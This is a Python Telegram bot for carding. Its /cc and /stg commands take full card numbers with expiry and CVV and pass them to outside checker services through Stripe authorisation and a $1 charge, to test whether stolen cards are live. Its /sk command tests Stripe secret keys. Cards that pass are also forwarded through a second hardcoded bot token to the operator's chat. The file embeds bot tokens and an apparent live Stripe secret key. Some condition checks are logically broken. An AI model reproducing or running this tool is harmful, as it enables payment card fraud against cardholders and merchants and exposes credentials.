import telebot
import re
from datetime import time , date , datetime
import time
import requests

tk = "5015737423:AAEoKl3GJqE-eds1KtjUzI8hIPBEjYFiA_g"
bot = telebot.TeleBot ( tk , parse_mode='HTML' )
li = ['1935904246' , '2019913786']


@bot.message_handler ( commands=['start' , 'help'] )
def send_welcome ( message ) :
    bot.reply_to ( message , "click of /cmds" )


@bot.message_handler ( commands=['cmds'] )
def send_welcome ( message ) :
    bot.reply_to ( message , """
	<b>𝙒𝙀𝙇𝘾𝙊𝙈 𝙄𝙉 𝙐𝙎 𝘽𝙊𝙏</b>
	/cc  -------> 𝙂𝙀𝙏 1   <b>Ｓｔｒｉｐ　Ａｕｔｈ </b>
	/stg -------> 𝙂𝙀𝙏 2 <b>Ｓｔｒｉｐ Ｃｈａｒｇｅ １＄</b>
	/bin -------> 𝘾𝙃𝙀𝘼𝙆 𝘽𝙄𝙉
	/id  -------> 𝙂𝙀𝙏 𝙔𝙊𝙐𝙍 𝙄𝘿
	𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣""" )


@bot.message_handler ( commands=['cc'] )
def snd_welcome ( message ) :
    ccu = message.text
    dd = message.text.split ( '|' )
    cc22 = dd[0]
    if cc22 != message.text :
        cc1 = ccu.split ( '/cc ' )[1]
        res = "^[0-9]+[|]+[0-9]+[|]+[0-9]+[|]+[0-9]"
        tt = re.match ( res , cc1 )
        if tt == None :
            bot.reply_to ( message , '<b> YOUR FORMAT WORNG</b>\n /cc  cc|ｍｍ|ｙｙ|ｃｖｖ' )
        else :
            yy = cc1.split ( '|' )
            cc = yy[0]
            mth = yy[1]
            ye = yy[2]
            cvv = yy[3]
            now = datetime.now ()
            xx = '<i>' + cc + '|' + mth + '|' + ye + '|' + cvv + '</i>' + '\n'
            url = f'https://lookup.binlist.net/{cc}'
            r = requests.get ( url ).text
            img = \
            r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '"},' )[0].split ( '"emoji":"' )[1].split (
                '","' )[0]
            shm = '<i>|-𝙨𝙘𝙝𝙚𝙢𝙚:</i>\t' + r.split ( '"scheme":"' )[1].split ( '","' )[0] + '\n'
            tp = '<i>|- 𝙏𝙔𝙋𝙀:</i>\t' + r.split ( '"type":"' )[1].split ( '","' )[0] + '\n'
            lvel = '<i>|- 𝙇𝙀𝙑𝙀𝙇:</i>\t' + r.split ( '"brand":"' )[1].split ( '","' )[0] + '\n'
            cont = '<i>|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔:</i>\t' + \
                   r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[0] + '\t' + img + '\n'
            date = '<i>|-𝘿𝘼𝙏𝙀:</i>\t' + str ( now ) + '\n'
            auther = '𝙗𝙤𝙩𝘽𝙮 : <a herf="https://t.me/n2k4n">𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣</a>'
            x = str ( message.chat.id )
            if x in li :
                idb = 'http://deadstripe.ngrok.io/Stripe/api.php?lista=' + cc1
                print ( idb )
                rr = requests.get ( idb ).text
                rps = rr.split ( '<span class="badge badge-Danger">' )[1].split ( '</span>' )[0]
                if 'Declined' or 'Card Doesnt Support Purchase' or "DEAD" or "Generic declined" or "#Declined" or "Your card number is incorrect." or "Your card was declined." or "stolen_card" in rr :
                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:' + str (
                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
                    msg = '<i>|-𝘾𝘾 :</i>\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
                    bot.reply_to ( message , msg )
                else :
                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:' + str (
                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b> ✅\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
                    msg = '<i>|-𝘾𝘾 :</i>\t' + xx + shm + rps + tp + lvel + cont + us + date + auther
                    bot.reply_to ( message , msg )
                    snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                    requests.post ( snd )
            else :
                y = "contact @N2k4n for allwed you"
                bot.reply_to ( message , y )
    else :
        bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
/cc  ｃｃ|ｍｍ|ｙｙ|ｃｖｖ ''' )


@bot.message_handler ( commands=['bin'] )
def snd_welcome ( message ) :
    yy = message.text
    cc1 = yy.split ( '/bin' )[1]
    res = "^[\s]+[0-9]"
    tt = re.match ( res , cc1 )
    if tt == None :
        bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
/bin  BIN ''' )

    else :
        cc = cc1.split ( ' ' )[1]
        now = datetime.now ()
        url = f'https://lookup.binlist.net/{cc}'
        r = requests.get ( url ).text
        img = r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '"},' )[0].split ( '"emoji":"' )[1].split (
            '","' )[0]
        shm = '<i>|-𝙨𝙘𝙝𝙚𝙢𝙚:</i>\t' + r.split ( '"scheme":"' )[1].split ( '","' )[0] + '\n'
        tp = '<i>|- 𝙏𝙔𝙋𝙀:</i>\t' + r.split ( '"type":"' )[1].split ( '","' )[0] + '\n'
        lvel = '<i>|- 𝙇𝙀𝙑𝙀𝙇:</i>\t' + r.split ( '"brand":"' )[1].split ( '","' )[0] + '\n'
        cont = '<i>|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔:</i>\t' + r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[
            0] + '\t' + img + '\n'
        bank = '<i>|- 𝘽𝘼𝙉𝙆:</i>\t' + r.split ( ',"bank":{"name":"' )[1].split ( '","' )[0] + '\n'
        date = '<i>|-𝘿𝘼𝙏𝙀:</i>\t' + str ( now ) + '\n'
        auther = '𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣'
        msg = '<i>|-𝘽I𝙉 :</i>\t' + cc[0] + cc[1] + cc[2] + cc[3] + cc[4] + cc[5] + cc[
            6] + '\n' + shm + tp + lvel + cont + bank + date + auther
        bot.reply_to ( message , msg )


@bot.message_handler ( commands=['id'] )
def send_welcome ( message ) :
    x = '''|-<b>𝙔𝙊𝙐𝙍 𝙄𝘿 𝙄𝙎:\t</b>   ''' + str ( message.chat.id ) + '\n𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣'

    bot.reply_to ( message , x )


@bot.message_handler ( commands=['stg'] )
def snd_welcome ( message ) :
    ccu = message.text
    dd = message.text.split ( '|' )
    cc22 = dd[0]
    if cc22 != message.text :
        cc1 = ccu.split ( '/stg ' )[1]
        res = "^[0-9]+[|]+[0-9]+[|]+[0-9]+[|]+[0-9]"
        tt = re.match ( res , cc1 )
        if tt == None :
            bot.reply_to ( message , '<b> YOUR FORMAT WORNG</b>\n /stg cc|ｍｍ|ｙｙ|ｃｖｖ' )
        else :
            yy = cc1.split ( '|' )
            cc = yy[0]
            mth = yy[1]
            ye = yy[2]
            cvv = yy[3]
            now = datetime.now ()
            xx = '<i>' + cc + '|' + mth + '|' + ye + '|' + cvv + '</i>' + '\n'
            url = f'https://lookup.binlist.net/{cc}'
            r = requests.get ( url ).text
            img = \
            r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '"},' )[0].split ( '"emoji":"' )[1].split (
                '","' )[0]
            shm = '<i>|-𝙨𝙘𝙝𝙚𝙢𝙚:</i>\t' + r.split ( '"scheme":"' )[1].split ( '","' )[0] + '\n'
            tp = '<i>|- 𝙏𝙔𝙋𝙀:</i>\t' + r.split ( '"type":"' )[1].split ( '","' )[0] + '\n'
            lvel = '<i>|- 𝙇𝙀𝙑𝙀𝙇:</i>\t' + r.split ( '"brand":"' )[1].split ( '","' )[0] + '\n'
            cont = '<i>|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔:</i>\t' + \
                   r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[0] + '\t' + img + '\n'
            date = '<i>|-𝘿𝘼𝙏𝙀:</i>\t' + str ( now ) + '\n'
            auther = '𝙗𝙤𝙩𝘽𝙮 : <a herf="https://t.me/n2k4n">𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣</a>'
            x = str ( message.chat.id )
            if x in li :
                idb = 'https://indianbinner.in/api/checker.php?lista=' + cc1 + '&sec=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'
                bot.reply_to ( message , "W8" )
                rr = requests.get ( idb ).text
                rps = rr.split ( '➜' )[1].split ( '➜ [ @IndianBinner 🦊]' )[0]
                if 'Generic Decline' in rr :
                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:' + str (
                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
                    msg = '<i>|-𝘾𝘾 :</i>\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
                    bot.reply_to ( message , msg )
                elif 'Request rate limit exceeded.' or 'rate_limit' :
                    bot.reply_to ( message , "CHEAK YOUR PROXY ---/ Retry " )
                else :
                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:' + str (
                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b> ✅\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
                    msg = '<i>|-𝘾𝘾 :</i>\t' + xx + shm + rps + tp + lvel + cont + us + date + auther
                    bot.reply_to ( message , msg )
                    snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                    requests.post ( snd )
            else :
                y = "contact @N2k4n for allwed you"
                bot.reply_to ( message , y )
    else :
        bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
/cc  ｃｃ|ｍｍ|ｙｙ|ｃｖｖ ''' )


@bot.message_handler ( commands=['sk'] )
def snd_welcome ( message ) :
    yy = message.text
    cc1 = yy.split ( '/sk' )[1]
    res = "^[\s]+[sk_]+[A-Za-z0-9]"
    tt = re.match ( res , cc1 )
    if tt == None :
        bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
/sk  sk_live************** ''' )

    else :
        sk = cc1.split ( ' ' )[1]
        url = 'https://indianbinner.in/api/skchecker.php?lista=' + sk
        r = requests.get ( url ).text
        x = str ( message.chat.id )
        if x in li :
            if "Live" in r :
                bot.reply_to ( message , sk + '<b>LIVE ✅</b>\n 𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣' )
        else :
            bot.reply_to ( message , sk + '<b>DEAD ❌</b>\n 𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣' )


bot.infinity_polling ()
